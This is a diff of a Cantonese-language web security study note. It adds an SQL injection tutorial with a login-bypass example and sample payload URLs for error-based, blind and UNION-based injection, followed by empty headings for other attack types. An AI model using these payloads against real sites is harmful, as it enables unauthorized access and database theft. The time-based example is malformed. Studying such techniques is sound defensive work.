@@ -1,20 +1,91 @@
-﻿# WEB Security
+# WEB Security
 
 係Web Security入面,主要就有幾種玩法
 
- - SQL injection
+##  - SQL injection ##
+一個駭客最愛的攻擊方法,原自於給用戶輸入的data field處理不當,而使用戶能直接存取database的漏洞
+以一個URL為例:
+> 
+    http://www.insecure.com/login.php?usr=admin&pass=123
+    
+係呢一個URL入面,好明顯係為左將usr同pass既資料傳到SQL入面,再send比database以作認證,而當中既SQL語句亦好可能係咁:
+   
+>SELECT * FROM UserTable WHERE usr='admin' and pass=123;
+    
+咁既話,如果有人入左奇怪既URL input的話,例如:
+> http://www.insecure.com/login.php?usr=admin&pass=123' or 1=1 --
+
+咁樣既話,放入SQL既語句就變左以下:
+>SELECT * FROM UserTable WHERE usr='admin' and pass=123' or 1=1 --;
+
+係呢個情況之下,最終語句就會變左:
+>SELECT * FROM UserTable WHERE True;
+
+亦即使話,如果呢個係一個login system的話,咁呢個人兄唔洗username同password就可能進入你既系統
+
+以上為簡單的proof of concept
+
+SQL 分以下三大類:
+
+ - Error Base SQL injection
+
+基本SQL injection,不解釋
+
+例子:
+>http://abc.com?id=1'<--使URL報錯,從而得知SQL架構並控制
+>http://abc.com?id=1' and 1=2-- <--破壞where條件,使其false
+>http://abc.com?id=1' or 1=1-- <--破壞where條件,使其true
+
+ - Blind Sql Injection
+
+現時只有傻仔admin先會容許自己網站報錯比人睇,所以一般都會使用blind SQL Injection泥brute force整個database
+
+例子:
+> http://newspaper.com/items.php?id=2 and 1=2 <-- Content-base
+> http://newspaper.com/items.php?id=2' THEN pg_sleep(5) ELSE NULL END FROM apps WHERE id = 1 ; <-- timebase
+
+ - UNION Base SQL injection
+
+簡而言之,就係爆庫
+
+例子如下:
+> http://cba.com?id=1' and 1=2 UNION all select 1,2 <--測試columns數量
+> 
+> http://cba.com?id=1' and 1=2 UNION all select 1,database() <--找出database
+> 
+> http://cba.com?id=1' and 1=2 UNION all select 1,table_name from INFORMATION_SCHEMA.tables <--找出table
+
+----------
+
+##  - LDAP injection ##
+
+
+----------
+
+##  - XSS injection ##
  
- - LDAP injection
+
+----------
+
+##  - Directory traversal ##
  
- - XSS injection
+
+----------
+
+##  - File Inclusion ##
  
- - Directory traversal
+
+----------
+
+##  - Cookie posioning ##
  
- - File Inclusion
- 
- - Cookie posioning
- 
- - Command Injection
+
+----------
+
+##  - Command Injection ##
+
+
+----------
 
 
 ## 實用工具如下:
